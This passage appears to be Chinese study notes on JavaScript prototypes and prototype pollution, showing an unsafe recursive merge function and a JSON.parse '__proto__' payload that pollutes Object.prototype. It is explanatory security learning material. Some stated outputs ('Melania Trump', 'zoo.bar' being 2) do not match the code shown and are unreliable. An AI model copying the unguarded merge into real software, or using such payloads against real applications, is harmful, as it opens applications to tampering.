3. `this.show = function() { console.log(this.bar); }` 定义一个新的函数，并将其赋值给 `show` 属性。这意味着每次创建 `Foo` 实例时，都会创建一个新的函数对象。

**每次定义方法的开销**

每次创建一个新的 `Foo` 对象，`this.show` 都会分配一个新的函数对象。这在内存和性能上不是最优的，尤其是当类的实例创建频繁时。因为每个实例都有自己的一份 `show` 方法，占用了额外的内存空间。

**优化方法：将方法定义在原型上**

一种更好的方式是将方法定义在原型链上，这样所有实例共享同一个方法。这不仅节省内存，还提高了性能。

```
javascript复制代码function Foo() {
    this.bar = 1;
}

Foo.prototype.show = function() {
    console.log(this.bar);
};

const foo1 = new Foo();
const foo2 = new Foo();

foo1.show(); // 输出 1
foo2.show(); // 输出 1
```

**原型链上的方法定义**

在这种方式下，方法只在 `Foo.prototype` 上定义一次，所有实例都会共享这个方法：

1. 当 `new Foo()` 被调用时，JavaScript 创建一个新的空对象，并将其原型设置为 `Foo.prototype`。
2. `this.bar = 1` 设置 `bar` 属性为 1。
3. `foo1` 和 `foo2` 共享 `Foo.prototype.show` 方法。这意味着所有实例都使用相同的 `show` 方法，不会为每个实例分配一个新的函数对象。

**优点**

- **内存效率**：方法在原型链上定义，所有实例共享同一个方法，节省内存。
- **性能提升**：减少了每次创建实例时的函数分配开销。

我们可以通过`Foo.prototype`来访问`Foo`类的原型，但`Foo`实例化出来的对象，是不能通过prototype访问原型的。这时候，就该`__proto__`登场了。

一个Foo类实例化出来的foo对象，可以通过`foo.__proto__`属性来访问Foo类的原型，也就是说：

```
foo.__proto__ == Foo.prototype
```

## 2. JavaScript原型链继承

所有类对象在实例化的时候将会拥有`prototype`中的属性和方法，这个特性被用来实现JavaScript中的继承机制。

```javascript
function Father(){
    this.lastname = 'L_name';
    this.name = 'F_name'
}

function Son(){
    this.name = 'S_name';
}

Son.prototype = Father
console.log(`Son name = ${Son.name}; Son lastname = ${Son.lastname}`)       // Son name = Son; Son lastname = undefined
console.log(Son.prototype)                                                  // [Function: Father]
Son.__proto__['lastname'] = 'Hacker'
console.log(`Son name = ${Son.name}; Son lastname = ${Son.lastname}`)       // Son name = Son; Son lastname = Hacker
```

Son类继承了Father类的`last_name`属性，最后输出的是`Name: Melania Trump`。

总结一下，对于对象son，在调用`son.last_name`的时候，实际上JavaScript引擎会进行如下操作：

1. 在对象son中寻找last_name
2. 如果找不到，则在`son.__proto__`中寻找last_name
3. 如果仍然找不到，则继续在`son.__proto__.__proto__`中寻找last_name
4. 依次寻找，直到找到`null`结束。比如，`Object.prototype`的`__proto__`就是`null`

以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：

1. 每个构造函数(constructor)都有一个原型对象(prototype)
2. 对象的`__proto__`属性，指向类的原型对象`prototype`
3. JavaScript使用prototype链实现继承机制

## 3. 原型链污染是什么

```javas
let foo = {'a': '1'}
foo.__proto__.hacker = 'Bomb'

let zoo = {}
console.log(zoo.hacker)         // 输出：Bomb
```

最后，虽然zoo是一个**空**对象`{}`，但`zoo.bar`的结果居然是2：

原因也显而易见：因为前面我们修改了foo的原型`foo.__proto__.bar = 2`，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。

后来，我们又用Object类创建了一个zoo对象`let zoo = {}`，zoo对象自然也有一个bar属性了。

那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是**原型链污染**。

在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？

我们思考一下，哪些情况下我们可以设置`__proto__`的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：

- 对象merge
- 对象clone（其实内核就是将待操作的对象merge到一个空对象中）

以对象merge为例，我们想象一个简单的merge函数：

```
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

在合并的过程中，存在赋值的操作`target[key] = source[key]`，那么，这个key如果是`__proto__`，是不是就可以原型链污染呢？

我们用如下代码实验一下：

```javascript
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

结果是，合并虽然成功了，但原型链没有被污染：

[![image.png](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png)](https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png)

这是因为，我们用JavaScript创建o2的过程（`let o2 = {a: 1, "__proto__": {b: 2}}`）中，`__proto__`已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是`[a, b]`，`__proto__`并不是一个key，自然也不会修改Object的原型。

那么，如何让`__proto__`被认为是一个键名呢？

我们将代码改成如下：

```javascript
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

可见，新建的o3对象，也存在b属性，说明Object已经被污染：

[![image.png](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png)](https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png)

这是因为，JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。

merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。

总结：这里其实没有太懂，主要是这个`merge`函数怎么运作的，大概的意思是只有经过`JSON.parse()`解析的`__proto__`才能成为一个真正的Key，此时会为上一级（父级）对象创建一个对象（键值对）`{"b":2}`
